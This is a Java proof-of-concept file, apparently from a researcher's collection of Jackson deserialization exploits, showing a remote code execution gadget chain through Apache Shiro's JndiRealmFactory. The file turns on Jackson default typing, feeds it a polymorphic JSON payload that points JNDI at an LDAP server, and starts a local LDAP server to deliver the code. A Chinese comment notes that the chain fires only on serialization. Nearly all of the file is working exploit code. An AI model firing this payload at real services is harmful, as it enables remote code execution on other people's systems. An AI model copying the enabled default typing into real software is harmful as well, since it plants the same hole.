package com.threedr3am.bug.jackson.rce;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.threedr3am.bug.common.server.LdapServer;
import java.io.IOException;

/**
 * 比较鸡肋，需要调用writeValueAsString才能触发，因为Collection<Realm> getRealms()的返回值虽然是Collection，
 * 但是貌似是因为有泛型子类型导致值解析使用AsArrayTypeDeserialize，然后getter的invoke之前判断不为空就抛异常了
 *
 * shiro-core gadget
 *
 * <dependency>
 *        <groupId>org.apache.shiro</groupId>
 *        <artifactId>shiro-core</artifactId>
 * </dependency>
 *
 * @author threedr3am
 */
public class ShiroPoc {

  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) throws IOException {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();

    String json = "[\"org.apache.shiro.realm.jndi.JndiRealmFactory\", {\"jndiNames\": \"ldap://localhost:43658/Calc\"}]";
    System.out.println(json.charAt(65));
    Object o = mapper.readValue(json, Object.class);
    mapper.writeValueAsString(o);
  }


}
